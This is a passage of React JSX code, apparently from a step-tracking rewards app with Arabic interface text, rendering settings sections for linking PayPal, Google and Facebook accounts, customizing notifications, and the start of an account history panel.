                   <button onClick={handleUnlinkPaypal} className="w-full py-2 bg-rose-500/10 text-rose-500 border border-rose-500/20 rounded-xl text-[10px] font-black">فك ربط الحساب 🔓</button>
                </div>
              ) : (
                <button onClick={() => { setTempPaypalEmail(''); setShowLinkPaypalModal(true); }} className="w-full py-4 bg-gradient-to-r from-indigo-600 to-indigo-500 text-white rounded-2xl font-black text-sm active:scale-95">🔗 ربط حساب PayPal الآن</button>
              )}
            </div>

            {/* Notifications Section */}
            <div className="bg-slate-900 rounded-[2.5rem] border border-slate-800 p-8 shadow-xl">
               <div className="flex items-center justify-between mb-6">
                  <div className="w-12 h-12 bg-indigo-500/10 rounded-2xl flex items-center justify-center text-2xl">🔔</div>
                  <h3 className="text-lg font-black text-white">تخصيص التنبيهات</h3>
               </div>
               <div className="space-y-4">
                  <NotificationEditor title="تحقيق هدف الخطوات" settingKey="goalAchieved" />
                  <NotificationEditor title="تحدي جديد متاح" settingKey="challengeAvailable" />
                  <NotificationEditor title="معلم ألف خطوة" settingKey="stepMilestone" />
               </div>
            </div>

            {/* Social Accounts Section */}
            <div className="bg-slate-900 rounded-[2.5rem] border border-slate-800 p-8 shadow-xl">
               <div className="flex items-center justify-between mb-6">
                  <div className="w-12 h-12 bg-slate-800 rounded-2xl flex items-center justify-center text-2xl">🌐</div>
                  <h3 className="text-lg font-black text-white">الحسابات الاجتماعية</h3>
               </div>
               
               <div className="space-y-4">
                  {/* Google */}
                  <div className={`p-4 rounded-3xl border transition-all ${stats.isGoogleLinked ? 'bg-blue-500/5 border-blue-500/20' : 'bg-slate-950 border-slate-800'}`}>
                     <div className="flex items-center justify-between">
                        {stats.isGoogleLinked ? (
                          <div className="flex flex-col items-end">
                            <span className="text-blue-400 font-black text-xs">متصل بجوجل</span>
                            <span className="text-[10px] text-slate-500">{stats.googleEmail}</span>
                          </div>
                        ) : (
                          <span className="text-slate-500 font-bold text-xs tracking-tighter uppercase">غير مرتبط</span>
                        )}
                        <div className="flex items-center gap-3">
                           <span className="font-bold text-white text-sm">Google</span>
                           <img src="https://img.icons8.com/color/48/google-logo.png" className="w-6 h-6" />
                        </div>
                     </div>
                     <button 
                       disabled={isLinkingSocial === 'google'}
                       onClick={() => stats.isGoogleLinked ? handleUnlinkSocial('google') : handleLinkSocial('google')}
                       className={`w-full mt-4 py-2 rounded-xl text-[10px] font-black transition-all ${stats.isGoogleLinked ? 'text-rose-400 hover:bg-rose-500/10' : 'bg-white text-slate-950'} flex items-center justify-center gap-2`}
                     >
                       {isLinkingSocial === 'google' ? (
                          <div className="w-3 h-3 border-2 border-slate-800 border-t-transparent rounded-full animate-spin"></div>
                       ) : null}
                       {stats.isGoogleLinked ? 'فك الربط' : 'ربط الحساب الآن'}
                     </button>
                  </div>

                  {/* Facebook */}
                  <div className={`p-4 rounded-3xl border transition-all ${stats.isFacebookLinked ? 'bg-indigo-500/5 border-indigo-500/20' : 'bg-slate-950 border-slate-800'}`}>
                     <div className="flex items-center justify-between">
                        {stats.isFacebookLinked ? (
                          <div className="flex flex-col items-end">
                            <span className="text-indigo-400 font-black text-xs">متصل بفيسبوك</span>
                            <span className="text-[10px] text-slate-500">{stats.facebookName}</span>
                          </div>
                        ) : (
                          <span className="text-slate-500 font-bold text-xs tracking-tighter uppercase">غير مرتبط</span>
                        )}
                        <div className="flex items-center gap-3">
                           <span className="font-bold text-white text-sm">Facebook</span>
                           <img src="https://img.icons8.com/color/48/facebook-new.png" className="w-6 h-6" />
                        </div>
                     </div>
                     <button 
                       disabled={isLinkingSocial === 'facebook'}
                       onClick={() => stats.isFacebookLinked ? handleUnlinkSocial('facebook') : handleLinkSocial('facebook')}
                       className={`w-full mt-4 py-2 rounded-xl text-[10px] font-black transition-all ${stats.isFacebookLinked ? 'text-rose-400 hover:bg-rose-500/10' : 'bg-[#1877F2] text-white'} flex items-center justify-center gap-2`}
                     >
                       {isLinkingSocial === 'facebook' ? (
                          <div className="w-3 h-3 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                       ) : null}
                       {stats.isFacebookLinked ? 'فك الربط' : 'ربط الحساب الآن'}
                     </button>
                  </div>
               </div>
            </div>

            {/* History Section */}
            <div className="bg-slate-900 rounded-[2.5rem] border border-slate-800 p-6">
               <div className="flex items-center justify-between mb-4">
                  <span className="bg-indigo-500/10 text-indigo-400 text-[9px] font-black px-2 py-1 rounded-full border border-indigo-500/20 uppercase tracking-tighter">سجل الربط</span>
                  <h4 className="font-black text-white">تاريخ الحسابات</h4>
               </div>
               <div className="space